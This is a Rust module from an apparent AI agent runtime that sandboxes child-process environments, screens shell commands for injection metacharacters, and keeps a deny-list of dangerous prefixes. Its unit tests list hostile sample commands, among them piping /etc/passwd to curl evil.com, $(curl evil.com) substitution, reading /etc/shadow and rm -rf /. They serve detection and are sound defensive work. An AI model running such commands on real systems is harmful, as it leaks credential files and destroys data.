//! Subprocess environment sandboxing.
//!
//! When the runtime spawns child processes (e.g. for the `shell` tool), we
//! must strip the inherited environment to prevent accidental leakage of
//! secrets (API keys, tokens, credentials) into untrusted code.
//!
//! This module provides helpers to:
//! - Clear the child's environment and re-add only a safe allow-list.
//! - Validate executable paths before spawning.

/// Environment variables considered safe to inherit on all platforms.
pub const SAFE_ENV_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
];

/// Additional environment variables considered safe on Windows.
#[cfg(windows)]
pub const SAFE_ENV_VARS_WINDOWS: &[&str] = &[
    "USERPROFILE",
    "SYSTEMROOT",
    "APPDATA",
    "LOCALAPPDATA",
    "COMSPEC",
    "WINDIR",
    "PATHEXT",
];

/// Sandboxes a `tokio::process::Command` by clearing its environment and
/// selectively re-adding only safe variables.
///
/// After calling this function the child process will only see:
/// - The platform-independent safe variables (`SAFE_ENV_VARS`)
/// - On Windows, the Windows-specific safe variables (`SAFE_ENV_VARS_WINDOWS`)
/// - Any additional variables the caller explicitly allows via `allowed_env_vars`
///
/// Variables that are not set in the current process environment are silently
/// skipped (rather than being set to empty strings).
pub fn sandbox_command(cmd: &mut tokio::process::Command, allowed_env_vars: &[String]) {
    cmd.env_clear();

    // Re-add platform-independent safe vars.
    for var in SAFE_ENV_VARS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add Windows-specific safe vars.
    #[cfg(windows)]
    for var in SAFE_ENV_VARS_WINDOWS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add caller-specified allowed vars.
    for var in allowed_env_vars {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}

// ---------------------------------------------------------------------------
// Shell/exec allowlisting
// ---------------------------------------------------------------------------

use carrier_types::config::{ExecPolicy, ExecSecurityMode};
use carrier_types::error::{CarrierError, CarrierResult};

/// Detect actual brace expansion patterns like `{a,b}` or `{1..10}`.
/// Single braces (e.g. in JSON arguments like `{"key":"val"}`) are NOT expansion.
fn contains_brace_expansion(s: &str) -> bool {
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'{' {
            let start = i + 1;
            let mut depth = 1;
            let mut j = start;
            while j < bytes.len() && depth > 0 {
                match bytes[j] {
                    b'{' => depth += 1,
                    b'}' => depth -= 1,
                    _ => {}
                }
                j += 1;
            }
            if depth == 0 {
                let inner = &s[start..j - 1];
                // {1..10} or {a..z} — range expansion
                if inner.contains("..") {
                    return true;
                }
                // {a,b,c} — comma-separated simple items (no colons, no spaces)
                if inner.contains(',') && !inner.contains(", ") && !inner.contains(':') {
                    return true;
                }
                i = j;
            } else {
                i = start;
            }
        } else {
            i += 1;
        }
    }
    false
}

/// SECURITY: Check for shell metacharacters that enable command injection.
///
/// Blocks ALL shell operators that can chain commands, redirect I/O,
/// perform substitution, or otherwise escape the intended command boundary.
/// This is a defense-in-depth layer — even with allowlist validation,
/// metacharacters must be rejected first to prevent injection.
pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
    // ── Command substitution ──────────────────────────────────────────
    // Backtick substitution: `cmd`
    if command.contains('`') {
        return Some("backtick command substitution".to_string());
    }
    // Dollar-paren substitution: $(cmd)
    if command.contains("$(") {
        return Some("$() command substitution".to_string());
    }
    // Dollar-brace expansion: ${VAR}
    if command.contains("${") {
        return Some("${} variable expansion".to_string());
    }

    // ── Command chaining ──────────────────────────────────────────────
    // Semicolons: cmd1;cmd2
    if command.contains(';') {
        return Some("semicolon command chaining".to_string());
    }
    // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
    if command.contains('|') {
        return Some("pipe operator".to_string());
    }

    // ── I/O redirection ───────────────────────────────────────────────
    // Output/input/append redirect: >, <, >>
    // Also catches here-strings <<<, process substitution <() >()
    if command.contains('>') || command.contains('<') {
        return Some("I/O redirection".to_string());
    }

    // ── Expansion and globbing ────────────────────────────────────────
    // Brace expansion: {cmd1,cmd2} or {1..10}
    // Context-aware: single braces in JSON args like {"key":"val"} are NOT expansion.
    if contains_brace_expansion(command) {
        return Some("brace expansion".to_string());
    }

    // ── Embedded newlines ─────────────────────────────────────────────
    if command.contains('\n') || command.contains('\r') {
        return Some("embedded newline".to_string());
    }
    // Null bytes (can truncate strings in C-based shells)
    if command.contains('\0') {
        return Some("null byte".to_string());
    }

    // ── Background execution and logical chaining ──────────────────────
    // Both & (background) and && (logical AND) are dangerous — EXCEPT the one
    // canonical agent pattern `cd <DIR> && <REST>`, where `cd` just changes cwd
    // and <REST> is a single command (the flow shell_allow match layer
    // separately verifies <DIR> is inside the workspace and <REST> matches a
    // pattern). is_safe_cd_and_chain checks the shape and that <REST> carries
    // no further chaining/redirect/substitution.
    if command.contains('&') && !is_safe_cd_and_chain(command) {
        return Some("ampersand operator".to_string());
    }
    None
}

/// True iff `command` is exactly `cd <DIR> && <REST>` where `<REST>` carries
/// no shell metacharacters (no `;` `|` `&` `<` `>` backtick, no `$()` `${}`,
/// no embedded newline/null).
///
/// This is the metacharacter-gate's allowlist for the `&&` operator: only the
/// single `cd &&` agent pattern is permitted, and only when the second command
/// is itself injection-free. The `<DIR>` workspace-containment check is NOT
/// done here (this fn is stateless / workspace-agnostic) — it is enforced by
/// `flow::strip_cd_prefix` at the shell_allow match layer, which runs before
/// exec. So a `cd /etc && python3 x.py` passes this gate but is rejected by
/// the match layer for being outside the workspace.
fn is_safe_cd_and_chain(command: &str) -> bool {
    let trimmed = command.trim();
    let after_cd = match trimmed.strip_prefix("cd") {
        Some(s) => s,
        None => return false,
    };
    // `cd` must be a whole word.
    match after_cd.chars().next() {
        Some(c) if c.is_whitespace() => {}
        _ => return false,
    }
    let after_cd = after_cd.trim_start();
    let amp = match after_cd.find(" && ") {
        Some(i) => i,
        None => return false,
    };
    let rest = after_cd[amp + 4..].trim();
    if rest.is_empty() {
        return false;
    }
    // REST must not contain any further chaining / redirect / substitution.
    !rest.contains('&')
        && !rest.contains('|')
        && !rest.contains(';')
        && !rest.contains('>')
        && !rest.contains('<')
        && !rest.contains('`')
        && !rest.contains("$(")
        && !rest.contains("${")
        && !rest.contains('\n')
        && !rest.contains('\r')
        && !rest.contains('\0')
}

/// Extract the base command name from a command string.
/// Handles paths (e.g., "/usr/bin/python3" → "python3").
fn extract_base_command(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    // Take first word (space-delimited)
    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    // Strip path prefix
    first_word
        .rsplit('/')
        .next()
        .unwrap_or(first_word)
        .rsplit('\\')
        .next()
        .unwrap_or(first_word)
}

/// Extract all commands from a shell command string.
/// Handles pipes (`|`), semicolons (`;`), `&&`, and `||`.
fn extract_all_commands(command: &str) -> Vec<&str> {
    let mut commands = Vec::new();
    // Split on pipe, semicolon, &&, ||
    // We need to split carefully: first split on ; and &&/||, then on |
    let mut rest = command;
    while !rest.is_empty() {
        // Find the earliest separator
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = &rest[..earliest_pos];
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base);
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    commands
}

/// Hard-banned dangerous command prefixes — a runtime floor that applies even
/// in Full exec mode or when a flow-scoped `shell_allow` pattern matched (both
/// of which otherwise bypass the exec-policy allowlist). Token-aware: matches
/// the base command name plus any required flag, never a naive substring — so
/// `python3 scripts/run.py` is NOT flagged, but `python3 -c ...` is.
///
/// Returns `Some((reason, suggestion))` for the first matched entry.
pub fn check_dangerous_prefix(command: &str) -> Option<(String, String)> {
    let tokens: Vec<&str> = command.split_whitespace().collect();
    let base = extract_base_command(command);
    for (bases, flags, reason, suggestion) in DANGEROUS_PREFIXES {
        // A base name ending in `*` is a prefix match (e.g. `mkfs*` catches
        // `mkfs.ext4`, `mkfs.xfs`); otherwise exact.
        let base_hit = bases.iter().any(|b| {
            if let Some(prefix) = b.strip_suffix('*') {
                base.starts_with(prefix)
            } else {
                *b == base
            }
        });
        if !base_hit {
            continue;
        }
        if flags.is_empty() {
            return Some(((*reason).to_string(), (*suggestion).to_string()));
        }
        // `flags` may be `-`-prefixed options (`-c`, `-rf`) or bare tokens
        // (`777`). Skip the base command token itself.
        if tokens.iter().skip(1).any(|t| flags.contains(t)) {
            return Some(((*reason).to_string(), (*suggestion).to_string()));
        }
    }
    None
}

/// (base command names, required flags, reason, safer alternative). An empty
/// flags slice means any invocation of that base command is banned.
const DANGEROUS_PREFIXES: &[(&[&str], &[&str], &str, &str)] = &[
    (
        &["sudo"],
        &[],
        "提权",
        "去掉 sudo —— daemon 用户已有所需权限，flow 脚本无需提权",
    ),
    (
        &["rm"],
        &["-rf", "-fr", "-r", "-R", "--recursive"],
        "不可逆递归删除",
        "用 file_remove 工具，或对明确命名的单文件执行 rm（勿带 -r/-rf）",
    ),
    (
        &["bash", "sh", "zsh", "dash", "ksh"],
        &["-c"],
        "嵌套 shell / 命令混淆",
        "直接 shell_exec 跑目标命令，不套第二层 shell",
    ),
    (
        &["python", "python2", "python3"],
        &["-c"],
        "内联代码执行，绕过脚本审查",
        "把代码写进脚本文件再 python3 <file>",
    ),
    (
        &["node", "nodejs"],
        &["-e", "-p"],
        "内联 JS eval",
        "把代码写进文件再 node <file>",
    ),
    (
        &["osascript"],
        &[],
        "macOS 自动化",
        "改用类型化工具（file_* / 对应 API 工具）",
    ),
    (
        &["powershell", "pwsh"],
        &["-EncodedCommand", "-enc"],
        "编码命令混淆",
        "明文执行",
    ),
    (&["mkfs*", "dd"], &[], "裸磁盘写入", "flow 永不需要，拒绝"),
    (
        &["chmod"],
        &["777"],
        "权限放宽（世界可写）",
        "用最小权限，勿用 777",
    ),
];

/// Validate a shell command against the exec policy.
///
/// Returns `Ok(())` if the command is allowed, `Err(reason)` if blocked.
pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> CarrierResult<()> {
    match policy.mode {
        ExecSecurityMode::Deny => Err(CarrierError::InvalidInput(
            "Shell execution is disabled (exec_policy.mode = deny)".to_string(),
        )),
        ExecSecurityMode::Full => {
            tracing::warn!(
                command = crate::str_utils::safe_truncate_str(command, 100),
                "Shell exec in full mode — no restrictions"
            );
            Ok(())
        }
        ExecSecurityMode::Allowlist => {
            // SECURITY: Check for shell metacharacters BEFORE base-command extraction.
            // These can smuggle commands inside arguments of allowed binaries.
            if let Some(reason) = contains_shell_metacharacters(command) {
                return Err(CarrierError::InvalidInput(format!(
                    "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
                )));
            }
            let base_commands = extract_all_commands(command);
            for base in &base_commands {
                // Check safe_bins first
                if policy.safe_bins.iter().any(|sb| sb == base) {
                    continue;
                }
                // Check allowed_commands
                if policy.allowed_commands.iter().any(|ac| ac == base) {
                    continue;
                }
                return Err(CarrierError::InvalidInput(format!(
                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                    base
                )));
            }
            Ok(())
        }
    }
}

/// Validate a process command (separate command + args) against the exec policy.
///
/// Unlike `validate_command_allowlist` which parses a shell command string,
/// this validates a pre-split command and args — the form used by ProcessManager.
pub fn validate_process_command(
    command: &str,
    args: &[String],
    policy: &ExecPolicy,
) -> CarrierResult<()> {
    match policy.mode {
        ExecSecurityMode::Deny => Err(CarrierError::InvalidInput(
            "Process execution is denied by policy".to_string(),
        )),
        ExecSecurityMode::Full => Ok(()),
        ExecSecurityMode::Allowlist => {
            // Check for shell metacharacters in command + args
            let full = if args.is_empty() {
                command.to_string()
            } else {
                format!("{} {}", command, args.join(" "))
            };
            if let Some(reason) = contains_shell_metacharacters(&full) {
                return Err(CarrierError::InvalidInput(format!(
                    "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
                )));
            }
            // Check base command against allowlist
            let base = extract_base_command(command);
            if policy.safe_bins.iter().any(|sb| sb == base) {
                return Ok(());
            }
            if policy.allowed_commands.iter().any(|ac| ac == base) {
                return Ok(());
            }
            Err(CarrierError::InvalidInput(format!(
                "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                base
            )))
        }
    }
}

// ---------------------------------------------------------------------------
// Process tree kill — cross-platform graceful → force kill
// ---------------------------------------------------------------------------

/// Maximum grace period to prevent indefinite waits.
pub const MAX_GRACE_MS: u64 = 60_000;

/// Kill a process and all its children (process tree kill).
///
/// 1. Send graceful termination signal (SIGTERM on Unix, taskkill on Windows)
/// 2. Wait `grace_ms` for the process to exit
/// 3. If still running, force kill (SIGKILL on Unix, taskkill /F on Windows)
///
/// Returns `Ok(true)` if the process was killed, `Ok(false)` if it was already
/// dead, or `Err` if the kill operation itself failed.
pub async fn kill_process_tree(pid: u32, grace_ms: u64) -> CarrierResult<bool> {
    let grace = grace_ms.min(MAX_GRACE_MS);

    #[cfg(unix)]
    {
        kill_tree_unix(pid, grace).await
    }

    #[cfg(windows)]
    {
        kill_tree_windows(pid, grace).await
    }
}

#[cfg(unix)]
async fn kill_tree_unix(pid: u32, grace_ms: u64) -> CarrierResult<bool> {
    // SECURITY/STABILITY: never shell out to `/bin/kill -TERM -<pgid>` here.
    // Ubuntu 22.04 procps `kill` mis-parses `-<signal> -<pid>` and issues
    // kill(0, SIGTERM) - SIGTERM to the *caller's own* process group. On
    // GitHub-hosted runners that took down the entire job (the CI "runner
    // received a shutdown signal" deaths); in production it would SIGTERM the
    // daemon's own process group. Direct kill(2) syscalls only.
    let pid_i32 = pid as i32;

    // Try to kill the process group first (negative PID kills the group).
    // Fall back to killing just the process if no such group exists.
    if unsafe { libc::kill(-pid_i32, libc::SIGTERM) } != 0 {
        unsafe { libc::kill(pid_i32, libc::SIGTERM) };
    }

    // Wait for grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive (signal 0 = existence probe).
    let still_alive = unsafe { libc::kill(pid_i32, 0) } == 0;

    if still_alive {
        tracing::warn!(
            pid,
            "Process still alive after grace period, sending SIGKILL"
        );

        // Try group kill first, then direct.
        unsafe {
            libc::kill(-pid_i32, libc::SIGKILL);
            libc::kill(pid_i32, libc::SIGKILL);
        }
    }

    Ok(true)
}

#[cfg(windows)]
async fn kill_tree_windows(pid: u32, grace_ms: u64) -> CarrierResult<bool> {
    use tokio::process::Command;

    // Try graceful kill first (taskkill /T = tree, no /F = graceful).
    let graceful = Command::new("taskkill")
        .args(["/T", "/PID", &pid.to_string()])
        .output()
        .await;

    match graceful {
        Ok(output) if output.status.success() => {
            // Graceful kill succeeded.
            return Ok(true);
        }
        _ => {}
    }

    // Wait grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive using tasklist.
    let check = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .await;

    let still_alive = match &check {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            stdout.contains(&pid.to_string())
        }
        Err(_) => true, // Assume alive if we can't check.
    };

    if still_alive {
        tracing::warn!(pid, "Process still alive after grace period, force killing");
        // Force kill the entire tree.
        let force = Command::new("taskkill")
            .args(["/F", "/T", "/PID", &pid.to_string()])
            .output()
            .await;

        match force {
            Ok(output) if output.status.success() => Ok(true),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.contains("not found") || stderr.contains("no process") {
                    Ok(false) // Already dead.
                } else {
                    Err(CarrierError::Internal(format!(
                        "Force kill failed: {stderr}"
                    )))
                }
            }
            Err(e) => Err(CarrierError::Internal(format!(
                "Failed to execute taskkill: {e}"
            ))),
        }
    } else {
        Ok(true)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_grace_constants() {
        assert_eq!(MAX_GRACE_MS, 60_000);
    }

    #[test]
    fn test_grace_ms_capped() {
        // Verify the capping logic used in kill_process_tree.
        let capped = 100_000u64.min(MAX_GRACE_MS);
        assert_eq!(capped, 60_000);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_kill_process_tree_kills_child_group_not_caller() {
        // Regression: the old /bin/kill -TERM -<pgid> shell-out parsed as
        // kill(0, SIGTERM) on Ubuntu 22.04 procps and SIGTERMed the caller's
        // own process group (killed CI runners; in prod would kill the daemon
        // whenever an agent ended a persistent process). Direct libc::kill
        // must kill ONLY the child's group - if the caller's group died, this
        // test process would be terminated before reaching the asserts.
        let mut child = tokio::process::Command::new("sleep")
            .arg("30")
            .process_group(0)
            .spawn()
            .expect("spawn sleep");
        let pid = child.id().expect("pid");
        kill_process_tree(pid, 50)
            .await
            .expect("kill_process_tree ok");
        let status = child.wait().await.expect("wait child");
        assert!(
            !status.success(),
            "sleep 30 must be killed by the group kill, not exit normally"
        );
    }

    #[tokio::test]
    async fn test_kill_nonexistent_process() {
        // Killing a non-existent PID should not panic.
        // Use a very high PID unlikely to exist.
        let result = kill_process_tree(999_999, 100).await;
        // Result depends on platform, but must not panic.
        let _ = result;
    }

    // ── Exec policy tests ──────────────────────────────────────────────

    #[test]
    fn test_extract_base_command() {
        assert_eq!(extract_base_command("ls -la"), "ls");
        assert_eq!(
            extract_base_command("/usr/bin/python3 script.py"),
            "python3"
        );
        assert_eq!(extract_base_command("  echo hello  "), "echo");
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_all_commands_simple() {
        let cmds = extract_all_commands("ls -la");
        assert_eq!(cmds, vec!["ls"]);
    }

    #[test]
    fn test_extract_all_commands_piped() {
        let cmds = extract_all_commands("cat file.txt | grep foo | sort");
        assert_eq!(cmds, vec!["cat", "grep", "sort"]);
    }

    #[test]
    fn test_extract_all_commands_and_or() {
        let cmds = extract_all_commands("mkdir dir && cd dir || echo fail");
        assert_eq!(cmds, vec!["mkdir", "cd", "echo"]);
    }

    #[test]
    fn test_extract_all_commands_semicolons() {
        let cmds = extract_all_commands("echo a; echo b; echo c");
        assert_eq!(cmds, vec!["echo", "echo", "echo"]);
    }

    // ── Dangerous prefix blacklist tests ────────────────────────────────

    #[test]
    fn test_dangerous_prefix_blocks_recursive_rm() {
        assert!(check_dangerous_prefix("rm -rf /").is_some());
        assert!(check_dangerous_prefix("rm -r /tmp/x").is_some());
        assert!(check_dangerous_prefix("rm -fr /tmp/x").is_some());
        assert!(check_dangerous_prefix("/bin/rm --recursive foo").is_some());
    }

    #[test]
    fn test_dangerous_prefix_blocks_sudo_and_shell_c() {
        assert!(check_dangerous_prefix("sudo rm -rf /").is_some());
        assert!(check_dangerous_prefix("bash -c 'id'").is_some());
        assert!(check_dangerous_prefix("sh -c echo hi").is_some());
    }

    #[test]
    fn test_dangerous_prefix_blocks_inline_code() {
        assert!(check_dangerous_prefix("python3 -c 'print(1)'").is_some());
        assert!(check_dangerous_prefix("python -c 'x'").is_some());
        assert!(check_dangerous_prefix("node -e 'x'").is_some());
    }

    #[test]
    fn test_dangerous_prefix_blocks_disk_and_perms() {
        assert!(check_dangerous_prefix("mkfs.ext4 /dev/sda").is_some());
        assert!(check_dangerous_prefix("mkfs /dev/sda").is_some());
        assert!(check_dangerous_prefix("dd if=/dev/zero of=x").is_some());
        assert!(check_dangerous_prefix("chmod 777 file").is_some());
        assert!(check_dangerous_prefix("osascript -e 'x'").is_some());
    }

    #[test]
    fn test_dangerous_prefix_allows_safe_commands() {
        assert!(check_dangerous_prefix("python3 output/scripts/run.py").is_none());
        assert!(check_dangerous_prefix("python3 flows/outline-writer/scripts/x.py").is_none());
        assert!(check_dangerous_prefix("ffmpeg -i in.mp4 out.mp4").is_none());
        assert!(check_dangerous_prefix("mkdir -p output/foo").is_none());
        // Plain `rm <file>` (non-recursive) is a legitimate temp-cleanup pattern.
        assert!(check_dangerous_prefix("rm temp.txt").is_none());
        assert!(check_dangerous_prefix("chmod u+x script.sh").is_none());
    }

    #[test]
    fn test_deny_mode_blocks() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Deny,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("ls", &policy).is_err());
        assert!(validate_command_allowlist("echo hi", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_everything() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("rm -rf /", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_permits_safe_bins() {
        let policy = ExecPolicy::default();
        // Default safe_bins include "echo", "cat", "sort"
        assert!(validate_command_allowlist("echo hello", &policy).is_ok());
        assert!(validate_command_allowlist("cat file.txt", &policy).is_ok());
        assert!(validate_command_allowlist("sort data.csv", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_blocks_unlisted() {
        let policy = ExecPolicy::default();
        // "curl" is not in default safe_bins or allowed_commands
        assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
        assert!(validate_command_allowlist("rm -rf /", &policy).is_err());
    }

    #[test]
    fn test_allowlist_allowed_commands() {
        let policy = ExecPolicy {
            allowed_commands: vec!["cargo".to_string(), "git".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("cargo build", &policy).is_ok());
        assert!(validate_command_allowlist("git status", &policy).is_ok());
        assert!(validate_command_allowlist("npm install", &policy).is_err());
    }

    #[test]
    fn test_piped_command_blocked_by_metachar() {
        let policy = ExecPolicy::default();
        // SECURITY: Pipes are now blocked at the metacharacter layer, before allowlist
        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
        assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
    }

    #[test]
    fn test_default_policy_works() {
        let policy = ExecPolicy::default();
        assert_eq!(policy.mode, ExecSecurityMode::Allowlist);
        assert!(!policy.safe_bins.is_empty());
        assert!(policy.safe_bins.contains(&"echo".to_string()));
        assert!(policy.allowed_commands.is_empty());
        assert_eq!(policy.timeout_secs, 30);
        assert_eq!(policy.max_output_bytes, 100 * 1024);
    }

    // ── Shell metacharacter injection tests ──────────────────────────────

    #[test]
    fn test_metachar_backtick_blocked() {
        assert!(contains_shell_metacharacters("echo `whoami`").is_some());
        assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
    }

    #[test]
    fn test_metachar_dollar_paren_blocked() {
        assert!(contains_shell_metacharacters("echo $(id)").is_some());
        assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
    }

    #[test]
    fn test_metachar_dollar_brace_blocked() {
        assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
        assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
    }

    #[test]
    fn test_metachar_background_amp_blocked() {
        assert!(contains_shell_metacharacters("sleep 100 &").is_some());
        assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
    }

    #[test]
    fn test_metachar_double_amp_blocked() {
        // SECURITY: && is now blocked — command chaining via logical AND is dangerous
        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
    }

    #[test]
    fn test_metachar_newline_blocked() {
        assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
    }

    #[test]
    fn test_metachar_process_substitution_blocked() {
        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
    }

    #[test]
    fn test_metachar_clean_command_ok() {
        assert!(contains_shell_metacharacters("ls -la").is_none());
        assert!(contains_shell_metacharacters("cat file.txt").is_none());
        assert!(contains_shell_metacharacters("echo hello world").is_none());
    }

    #[test]
    fn test_metachar_pipe_blocked() {
        // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
    }

    #[test]
    fn test_metachar_semicolon_blocked() {
        assert!(contains_shell_metacharacters("echo hello;id").is_some());
        assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
    }

    #[test]
    fn test_metachar_redirect_blocked() {
        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
    }

    #[test]
    fn test_metachar_brace_expansion_blocked() {
        assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
        assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
    }

    #[test]
    fn test_metachar_json_braces_allowed() {
        // JSON arguments with braces should NOT be blocked
        assert!(contains_shell_metacharacters(r#"echo '{"key":"val"}'"#).is_none());
        assert!(contains_shell_metacharacters(r#"cat {"name":"test"}"#).is_none());
        assert!(contains_shell_metacharacters(r#"echo {"a":1,"b":2}"#).is_none());
    }

    #[test]
    fn test_contains_brace_expansion_cases() {
        // Actual brace expansion patterns
        assert!(contains_brace_expansion("{a,b,c}"));
        assert!(contains_brace_expansion("file{1..10}"));
        assert!(contains_brace_expansion("echo {a,b}"));
        // NOT brace expansion — JSON with spaces after commas
        assert!(!contains_brace_expansion(r#"{"key": "val"}"#));
        assert!(!contains_brace_expansion(r#"{"a": 1, "b": 2}"#));
        // NOT brace expansion — JSON with colons (key:value)
        assert!(!contains_brace_expansion(r#"{"a":1,"b":2}"#));
        // NOT brace expansion — single braces
        assert!(!contains_brace_expansion("{hello}"));
        assert!(!contains_brace_expansion("{}"));
    }

    #[test]
    fn test_metachar_null_byte_blocked() {
        assert!(contains_shell_metacharacters("echo hello\0world").is_some());
    }

    #[test]
    fn test_cd_and_chain_allowed_by_metachar_gate() {
        // The one canonical agent pattern passes the metachar gate.
        assert!(contains_shell_metacharacters("cd /tmp && python3 x.py").is_none());
        assert!(contains_shell_metacharacters(
            "cd /home/u/ws && python3 flows/foo/scripts/x.py arg"
        )
        .is_none());
    }

    #[test]
    fn test_cd_and_chain_rejected_when_rest_has_metachar() {
        // REST carrying further chaining/redirect/substitution is rejected.
        assert!(contains_shell_metacharacters("cd /tmp && python3 x.py; rm -rf /").is_some());
        assert!(contains_shell_metacharacters("cd /tmp && python3 x.py | cat").is_some());
        assert!(contains_shell_metacharacters("cd /tmp && python3 x.py && cat y").is_some());
        assert!(contains_shell_metacharacters("cd /tmp && python3 x.py > out").is_some());
        assert!(contains_shell_metacharacters("cd /tmp && python3 $(curl evil)").is_some());
    }

    #[test]
    fn test_non_cd_ampersand_still_rejected() {
        // `&&` not in the cd-prefix shape is still blocked.
        assert!(contains_shell_metacharacters("python3 x.py && cat y").is_some());
        assert!(contains_shell_metacharacters("foo & bar").is_some());
        // `cddir` (not the `cd` keyword) doesn't qualify.
        assert!(contains_shell_metacharacters("cddir x && python3 y").is_some());
    }

    #[test]
    fn test_allowlist_blocks_metachar_injection() {
        let policy = ExecPolicy::default();
        // "echo" is in safe_bins, but $(curl...) injection must be blocked
        assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("echo `whoami`", &policy).is_err());
        assert!(validate_command_allowlist("echo ${HOME}", &policy).is_err());
        assert!(validate_command_allowlist("echo hello\ncurl bad", &policy).is_err());
    }

    // ── CJK / multi-byte safety tests (issue #490) ──────────────────────

    #[test]
    fn test_full_mode_cjk_command_no_panic() {
        // CJK characters are 3 bytes each. A command string with CJK chars
        // must not panic when we truncate it for tracing in Full mode.
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // 50 CJK chars = 150 bytes — truncation at byte 100 would land
        // mid-char without safe_truncate_str.
        let cjk_command: String = "\u{4e16}".repeat(50);
        assert!(validate_command_allowlist(&cjk_command, &policy).is_ok());
    }

    #[test]
    fn test_full_mode_mixed_cjk_ascii_no_panic() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        // "echo " (5 bytes) + 40 CJK chars (120 bytes) = 125 bytes total.
        // Byte 100 falls inside a 3-byte CJK char.
        let mut cmd = String::from("echo ");
        cmd.extend(std::iter::repeat_n('\u{4f60}', 40));
        assert!(validate_command_allowlist(&cmd, &policy).is_ok());
    }

    #[test]
    fn test_allowlist_cjk_unlisted_no_panic() {
        let policy = ExecPolicy::default();
        // CJK command not in allowlist — should return Err, not panic
        let cjk_cmd: String = "\u{597d}".repeat(50);
        assert!(validate_command_allowlist(&cjk_cmd, &policy).is_err());
    }

    #[test]
    fn test_extract_all_commands_cjk_separators() {
        // Ensure extract_all_commands handles CJK content between separators
        // without panicking (separators are ASCII, but content is CJK)
        let cmd = "\u{4f60}\u{597d}";
        let cmds = extract_all_commands(cmd);
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0], "\u{4f60}\u{597d}");
    }
}
